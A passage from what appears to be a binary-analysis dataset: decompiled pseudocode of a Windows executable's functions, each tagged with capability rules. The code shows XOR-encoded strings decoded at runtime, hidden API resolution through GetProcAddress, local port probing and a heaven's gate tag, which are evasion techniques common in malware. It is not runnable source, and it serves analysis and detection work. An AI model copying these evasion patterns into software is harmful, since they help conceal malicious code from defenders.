var_2ch[0] = 0x49;\n    var_2ch[1] = 0x6b;\n    var_2ch[2] = 0x61;\n    var_2ch[3] = 0x6d;\n    var_28h = 0x51;\n    fcn.004012a0(10);\n    for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, var_48h[var_8h] ^ var_2ch[var_8h % 5]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    var_14h = (*var_20h)(arg_8h, arg_ch, arg_10h, 0, var_1ch, &var_3ch, &var_18h, 2, 0, 0x40);\n    var_24h = fcn.00411130(var_14h);\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_24h;\n}\n",
        "token_count": 1252
    },
    "00411830": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00411830(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint8_t var_28h [4];\n    uchar var_24h;\n    uchar var_23h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h._0_1_ = 0x27;\n    var_34h._1_1_ = 0x1f;\n    var_34h._2_1_ = 5;\n    var_34h._3_1_ = 1;\n    var_30h = 0x3d;\n    var_2fh = 0x67;\n    var_2eh = 0xf;\n    var_2dh = 0xd;\n    var_2ch = 1;\n    var_2bh = 0x51;\n    var_20h._0_1_ = 0x49;\n    var_20h._1_1_ = 0x6b;\n    var_20h._2_1_ = 0x61;\n    var_20h._3_1_ = 0x6d;\n    var_1ch = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_34h + var_4h) ^ *(&var_20h + var_4h % 5));\n    }\n    var_4ch._0_1_ = 0x21;\n    var_4ch._1_1_ = 0x19;\n    var_4ch._2_1_ = 0x36;\n    var_4ch._3_1_ = 0x1a;\n    var_48h = 4;\n    var_47h = 4;\n    var_46h = 0x1f;\n    var_45h = 0x3b;\n    var_44h = 10;\n    var_43h = 0x11;\n    var_42h = 0x1e;\n    var_41h = 0x2a;\n    var_40h = 9;\n    var_3fh = 0x3e;\n    var_3eh = 6;\n    var_3dh = 0x17;\n    var_3ch = 0x1d;\n    var_3bh = 0xc;\n    var_3ah = 0;\n    var_39h = 3;\n    var_38h = 99;\n    var_28h[0] = 0x6f;\n    var_28h[1] = 0x6d;\n    var_28h[2] = 99;\n    var_28h[3] = 0x74;\n    var_24h = 0x69;\n    var_23h = 0x65;\n    fcn.004012a0(0x15);\n    for (var_8h = 0; var_8h < 0x15; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_4ch + var_8h) ^ var_28h[var_8h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*var_14h)(arg_8h, arg_ch);\n    var_18h = fcn.00411130(uVar1);\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_18h;\n}\n",
        "token_count": 1120
    },
    "0041bf00": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041bf00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_68h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uint var_58h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4ch._0_1_ = 0x5a;\n    var_4ch._1_1_ = 0x54;\n    var_4ch._2_1_ = 0x14;\n    var_4ch._3_1_ = 0x68;\n    var_48h = 0x15;\n    var_47h = 0x6b;\n    var_46h = 0x5b;\n    var_45h = 0x54;\n    var_44h = 100;\n    var_43h = 0x68;\n    var_38h._0_1_ = 0x35;\n    var_38h._1_1_ = 0x54;\n    var_38h._2_1_ = 100;\n    var_38h._3_1_ = 0x68;\n    var_34h = 0x70;\n    var_33h = 0x6b;\n    fcn.004012a0(0x14);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_4ch + var_4h) ^ *(&var_38h + var_4h % 6));\n    }\n    var_58h._0_1_ = 0x26;\n    var_58h._1_1_ = 0x2c;\n    var_58h._2_1_ = 0x28;\n    var_58h._3_1_ = 0x1d;\n    var_54h = 0x36;\n    var_53h = 0x78;\n    var_52h = 0x47;\n    var_51h = 0x4a;\n    var_50h = 9;\n    var_4fh = 0x3d;\n    var_4eh = 0x16;\n    var_4dh = 0x4b;\n    var_40h[0] = 0x75;\n    var_40h[1] = 100;\n    var_40h[2] = 0x6d;\n    var_40h[3] = 0x51;\n    var_3ch = 0x7a;\n    var_3bh = 0x4b;\n    fcn.004012a0(0xc);\n    for (var_8h = 0; var_8h < 0xc; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_58h + var_8h) ^ var_40h[var_8h % 6]);\n    }\n    var_68h._0_1_ = 7;\n    var_68h._1_1_ = 0x50;\n    var_68h._2_1_ = 0x2b;\n    var_68h._3_1_ = 0x54;\n    var_64h = 0x35;\n    var_63h = 0x11;\n    var_62h = 0x40;\n    var_61h = 0x2b;\n    var_60h = 0x5b;\n    var_5fh = 0x2c;\n    var_5eh = 0x20;\n    var_5dh = 0x5d;\n    var_5ch = 0x19;\n    var_5bh = 0x38;\n    var_30h[0] = 0x54;\n    var_30h[1] = 0x38;\n    var_30h[2] = 0x4e;\n    var_30h[3] = 0x38;\n    var_2ch = 0x59;\n    fcn.004012a0(0xe);\n    for (var_ch = 0; var_ch < 0xe; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_68h + var_ch) ^ var_30h[var_ch % 5]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = fcn.00401270(arg_8h, arg_ch, 0, arg_10h);\n    var_24h = (*var_20h)(0, uVar1);\n    var_10h = var_24h;\n    if (0x20 < var_24h) {\n        var_10h = 0;\n    }\n    var_28h = var_10h;\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_28h;\n}\n",
        "token_count": 1515
    },
    "0041cb20": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041cb20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uchar var_24h;\n    uint var_20h;\n    uint var_1ch;\n    code *var_18h;\n    uint hModule;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_3ch._0_1_ = 0x27;\n    var_3ch._1_1_ = 0x1f;\n    var_3ch._2_1_ = 5;\n    var_3ch._3_1_ = 1;\n    var_38h = 0x3d;\n    var_37h = 0x67;\n    var_36h = 0xf;\n    var_35h = 0xd;\n    var_34h = 1;\n    var_33h = 0x51;\n    var_28h._0_1_ = 0x49;\n    var_28h._1_1_ = 0x6b;\n    var_28h._2_1_ = 0x61;\n    var_28h._3_1_ = 0x6d;\n    var_24h = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_3ch + var_4h) ^ *(&var_28h + var_4h % 5));\n    }\n    var_4ch._0_1_ = 0x31;\n    var_4ch._1_1_ = 0x30;\n    var_4ch._2_1_ = 0x7a;\n    var_4ch._3_1_ = 0x3b;\n    var_48h = 0;\n    var_47h = 0x58;\n    var_46h = 0x3b;\n    var_45h = 0x35;\n    var_44h = 0x5a;\n    var_43h = 0x28;\n    var_42h = 0;\n    var_41h = 0x45;\n    var_40h = 0x18;\n    var_3fh = 0x47;\n    var_30h[0] = 0x6b;\n    var_30h[1] = 0x47;\n    var_30h[2] = 0x35;\n    var_30h[3] = 0x4b;\n    var_2ch = 0x65;\n    var_2bh = 0x36;\n    fcn.004012a0(0xe);\n    for (var_8h = 0; var_8h < 0xe; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_4ch + var_8h) ^ var_30h[var_8h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    hModule = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    uVar1 = fcn.00401270();\n    var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar1);\n    var_20h = (*var_18h)(arg_8h, arg_ch, arg_10h, arg_14h);\n    var_1ch = var_20h;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_20h;\n}\n",
        "token_count": 1035
    },
    "0041d4d0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041d4d0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_b4h;\n    uint var_b0h;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uint var_98h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uint var_84h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uint8_t var_50h [4];\n    uchar var_4ch;\n    uchar var_4bh;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint8_t var_38h [4];\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b4h = 0;\n    if ((*0x436b18 | *0x436b1c) == 0) {\n        var_5ch._0_1_ = 0x27;\n        var_5ch._1_1_ = 0x1f;\n        var_5ch._2_1_ = 5;\n        var_5ch._3_1_ = 1;\n        var_58h = 0x3d;\n        var_57h = 0x67;\n        var_56h = 0xf;\n        var_55h = 0xd;\n        var_54h = 1;\n        var_53h = 0x51;\n        var_30h._0_1_ = 0x49;\n        var_30h._1_1_ = 0x6b;\n        var_30h._2_1_ = 0x61;\n        var_30h._3_1_ = 0x6d;\n        var_2ch = 0x51;\n        fcn.004012a0(10);\n        for (var_ch = 0; var_ch < 10; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, *(&var_5ch + var_ch) ^ *(&var_30h + var_ch % 5));\n        }\n        var_70h._0_1_ = 0x62;\n        var_70h._1_1_ = 0x47;\n        var_70h._2_1_ = 0x2f;\n        var_70h._3_1_ = 0x33;\n        var_6ch = 0xd;\n        var_6bh = 0x74;\n        var_6ah = 0x57;\n        var_69h = 0x5e;\n        var_68h = 0x1c;\n        var_67h = 0x33;\n        var_66h = 1;\n        var_65h = 0x43;\n        var_64h = 0x6c;\n        var_63h = 0x58;\n        var_62h = 0x1a;\n        var_61h = 0x33;\n        var_60h = 0x18;\n        var_5fh = 0x53;\n        var_5eh = 0x38;\n        var_40h._0_1_ = 0x38;\n        var_40h._1_1_ = 0x30;\n        var_40h._2_1_ = 0x68;\n        var_40h._3_1_ = 0x56;\n        var_3ch = 0x79;\n        var_3bh = 0x37;\n        fcn.004012a0(0x13);\n        for (var_10h = 0; var_10h < 0x13; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&var_70h + var_10h) ^ *(&var_40h + var_10h % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar2 = fcn.00401270();\n        *0x436b18 = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n        if (*0x436b18 == 0) {\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        else {\n            var_84h._0_1_ = 0x39;\n            var_84h._1_1_ = 0x11;\n            var_84h._2_1_ = 0x6a;\n            var_84h._3_1_ = 0x55;\n            var_80h = 0x1b;\n            var_7fh = 0x73;\n            var_7eh = 0xc;\n            var_7dh = 8;\n            var_7ch = 0x4d;\n            var_7bh = 0x55;\n            var_7ah = 0x17;\n            var_79h = 0x44;\n            var_78h = 0x37;\n            var_77h = 0xe;\n            var_76h = 0x4b;\n            var_75h = 0x55;\n            var_74h = 0xe;\n            var_73h = 0x54;\n            var_72h = 99;\n            var_48h._0_1_ = 99;\n            var_48h._1_1_ = 0x66;\n            var_48h._2_1_ = 0x39;\n            var_48h._3_1_ = 0x30;\n            var_44h = 0x6f;\n            var_43h = 0x30;\n            fcn.004012a0(0x13);\n            for (var_14h = 0; var_14h < 0x13; var_14h = var_14h + 1) {\n                fcn.00401280(var_14h, *(&var_84h + var_14h) ^ *(&var_48h + var_14h % 6));\n            }\n            uVar1 = fcn.00401270();\n            uVar2 = fcn.00401270();\n            *0x436b20 = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n            if (*0x436b20 == 0) {\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n            }\n            else {\n                var_98h._0_1_ = 0xe;\n                var_98h._1_1_ = 0x34;\n                var_98h._2_1_ = 0x25;\n                var_98h._3_1_ = 0x56;\n                var_94h = 0x3a;\n                var_93h = 0x22;\n                var_92h = 0x3d;\n                var_91h = 0x26;\n                var_90h = 0x1f;\n                var_8fh = 0x78;\n                var_8eh = 0x2c;\n                var_8dh = 0x27;\n                var_8ch = 0x31;\n                var_8bh = 0x20;\n                var_8ah = 0x1c;\n                var_89h = 0x5e;\n                var_88h = 0x25;\n                var_87h = 0x1a;\n                var_86h = 0x54;\n                var_50h[0] = 0x54;\n                var_50h[1] = 0x43;\n                var_50h[2] = 0x68;\n                var_50h[3] = 0x37;\n                var_4ch = 0x4a;\n                var_4bh = 0x74;\n                fcn.004012a0(0x13);\n                for (var_18h = 0; var_18h < 0x13; var_18h = var_18h + 1) {\n                    fcn.00401280(var_18h, *(&var_98h + var_18h) ^ var_50h[var_18h % 6]);\n                }\n                uVar1 = fcn.00401270();\n                uVar2 = fcn.00401270();\n                *0x436b28 = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n                if (*0x436b28 == 0) {\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n                else {\n                    var_b0h._0_1_ = 0x3b;\n                    var_b0h._1_1_ = 0x31;\n                    var_b0h._2_1_ = 0x23;\n                    var_b0h._3_1_ = 0x3f;\n                    var_ach = 0x23;\n                    var_abh = 0;\n                    var_aah = 0x36;\n                    var_a9h = 0x20;\n                    var_a8h = 0x38;\n                    var_a7h = 0x2b;\n                    var_a6h = 0x16;\n                    var_a5h = 9;\n                    var_a4h = 0x10;\n                    var_a3h = 2;\n                    var_a2h = 0x2b;\n                    var_a1h = 2;\n                    var_a0h = 0x32;\n                    var_9fh = 0x1f;\n                    var_9eh = 0x3e;\n                    var_9dh = 0x20;\n                    var_9ch = 0x61;\n                    var_38h[0] = 0x61;\n                    var_38h[1] = 0x46;\n                    var_38h[2] = 0x76;\n                    var_38h[3] = 0x51;\n                    var_34h = 0x4e;\n                    fcn.004012a0(0x15);\n                    for (var_1ch = 0; var_1ch < 0x15; var_1ch = var_1ch + 1) {\n                        fcn.00401280(var_1ch, *(&var_b0h + var_1ch) ^ var_38h[var_1ch % 5]);\n                    }\n                    uVar1 = fcn.00401270();\n                    uVar2 = fcn.00401270();\n                    *0x436b30 = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n                    if (*0x436b30 == 0) {\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                    }\n                    else {\n                        var_b4h = 0x436b18;\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                    }\n                }\n            }\n        }\n    }\n    else {\n        var_b4h = 0x436b18;\n    }\n    *0x436b34 = *0x436b30 >> 0x20;\n    *0x436b2c = *0x436b28 >> 0x20;\n    *0x436b24 = *0x436b20 >> 0x20;\n    *0x436b1c = *0x436b18 >> 0x20;\n    return var_b4h;\n}\n",
        "token_count": 3225
    },
    "00421090": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00421090(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint8_t var_28h [4];\n    uchar var_24h;\n    uchar var_23h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_20h = 0;\n    var_10h = *0x436b98;\n    var_1ch = fcn.00411800(0x436b98);\n    var_1ch = var_1ch & 0xff;\n    var_18h = fcn.00411800(0x436b98);\n    var_18h = var_18h & 0xff;\n    iVar1 = fcn.00421ed0(1, var_1ch, var_18h, 0x436b98, 0x436ba0, &var_8h);\n    if ((((iVar1 != 0) && (iVar1 = fcn.00421ed0(0, 0, 0, 0x436b98, 0x436ba4, &var_8h),  iVar1 != 0)) &&\n        (iVar1 = fcn.00421ed0(0, 0, 0, 0x436b98, 0x436ba8, &var_8h),  iVar1 != 0)) &&\n       (iVar1 = fcn.00421ed0(0, 0, 0, 0x436b98, 0x436b9c, &var_8h),  iVar1 != 0)) {\n        var_34h._0_1_ = 0x1d;\n        var_34h._1_1_ = 0x32;\n        var_34h._2_1_ = 0x21;\n        var_34h._3_1_ = 0x47;\n        var_30h = 0x39;\n        var_2fh = 0x33;\n        var_2eh = 0x56;\n        var_2dh = 0x32;\n        var_2ch = 0x44;\n        var_2bh = 0x47;\n        var_28h[0] = 0x33;\n        var_28h[1] = 0x32;\n        var_28h[2] = 0x44;\n        var_28h[3] = 0x47;\n        var_24h = 0x41;\n        var_23h = 0x33;\n        fcn.004012a0(0x14);\n        for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_34h + var_4h) ^ var_28h[var_4h % 6]);\n        }\n        uVar2 = fcn.00401270();\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x436ba4, uVar2);\n        iVar1 = fcn.00421ed0(0, 0, 0, 0x436b98, 0x436bb8, &var_8h);\n        if (iVar1 == 0) {\n            fcn.004012d0();\n        }\n        else {\n            var_10h = var_10h ^ 0x43316969;\n            var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar1 = fcn.00421ed0(0, 0, 0, &var_10h, 0x436bac, &var_8h);\n            if (iVar1 == 0) {\n                fcn.004012d0();\n            }\n            else {\n                var_14h = 1;\n                fcn.004012d0();\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 994
    },
    "004213b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004213b0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uint var_1ch;\n    code *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    puVar4 = &var_34h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h._0_1_ = 0x27;\n    var_40h._1_1_ = 0x1f;\n    var_40h._2_1_ = 5;\n    var_40h._3_1_ = 1;\n    var_3ch = 0x3d;\n    var_3bh = 0x67;\n    var_3ah = 0xf;\n    var_39h = 0xd;\n    var_38h = 1;\n    var_37h = 0x51;\n    var_24h._0_1_ = 0x49;\n    var_24h._1_1_ = 0x6b;\n    var_24h._2_1_ = 0x61;\n    var_24h._3_1_ = 0x6d;\n    var_20h = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_40h + var_4h) ^ *(&var_24h + var_4h % 5));\n    }\n    var_50h._0_1_ = 0x27;\n    var_50h._1_1_ = 0x24;\n    var_50h._2_1_ = 0x26;\n    var_50h._3_1_ = 4;\n    var_4ch = 0x3f;\n    var_4bh = 0x18;\n    var_4ah = 0x20;\n    var_49h = 0x3f;\n    var_48h = 0x33;\n    var_47h = 0x35;\n    var_46h = 0x36;\n    var_45h = 0x22;\n    var_44h = 0x29;\n    var_43h = 0x74;\n    var_42h = 0x62;\n    var_41h = 0x75;\n    var_2ch._0_1_ = 0x75;\n    var_2ch._1_1_ = 0x50;\n    var_2ch._2_1_ = 0x4a;\n    var_2ch._3_1_ = 0x47;\n    var_28h = 0x50;\n    fcn.004012a0(0x10);\n    for (var_8h = 0; var_8h < 0x10; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_50h + var_8h) ^ *(&var_2ch + var_8h % 5));\n    }\n    uVar2 = fcn.00401270();\n    uVar2 = fcn.00401270(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n    var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    cVar1 = fcn.00414250(&var_34h);\n    if (cVar1 != '\\0') {\n        var_14h = (*var_18h)(0, var_30h, var_34h);\n    }\n    fcn.004245f0(&var_34h);\n    var_1ch = var_14h;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_1ch;\n}\n",
        "token_count": 1175
    },
    "004222f0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004222f0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ushort extraout_var;\n    uint lpWSAData;\n    ushort name;\n    ushort var_32h;\n    uint var_30h;\n    uint32_t s;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uchar var_18h;\n    uchar var_17h;\n    uint8_t var_14h [4];\n    uchar var_10h;\n    uchar var_fh;\n    int32_t var_8h;\n    uint netshort;\n    \n    netshort._0_2_ = 0;\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, &lpWSAData);\n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n    if (uVar1 != 0xffffffff) {\n        s = uVar1;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        netshort._0_2_ = uVar1 + 2000;\n        while (netshort < 64000) {\n            var_20h._0_1_ = 0x41;\n            var_20h._1_1_ = 0x42;\n            var_20h._2_1_ = 0x5f;\n            var_20h._3_1_ = 0x46;\n            var_1ch = 0x40;\n            var_1bh = 0x4a;\n            var_1ah = 0x40;\n            var_19h = 0x5e;\n            var_18h = 0x59;\n            var_17h = 0x68;\n            var_14h[0] = 0x70;\n            var_14h[1] = 0x70;\n            var_14h[2] = 0x68;\n            var_14h[3] = 0x68;\n            var_10h = 0x70;\n            var_fh = 100;\n            fcn.004012a0(10);\n            for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_20h + var_8h) ^ var_14h[var_8h % 6]);\n            }\n            uVar2 = fcn.00401270();\n            var_30h = (*_sym.imp.WS2_32.dll_inet_addr)(uVar2);\n            var_32h = (*_sym.imp.WS2_32.dll_ntohs)(netshort);\n            name = 2;\n            iVar3 = (*_sym.imp.WS2_32.dll_bind)(s, &name, 0x10);\n            if (iVar3 == 0) {\n                (*_sym.imp.WS2_32.dll_closesocket)(s);\n                uVar1 = fcn.004012d0();\n                break;\n            }\n            fcn.004012d0();\n            netshort._0_2_ = netshort + 1;\n            uVar1 = CONCAT22(extraout_var, netshort);\n        }\n    }\n    return uVar1 & 0xffff0000 | netshort;\n}\n",
        "token_count": 780
    },
    "00415900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415900(uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(lpFileName);\n    var_4h = uVar1 != 0xffffffff;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 87
    },
    "004056c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
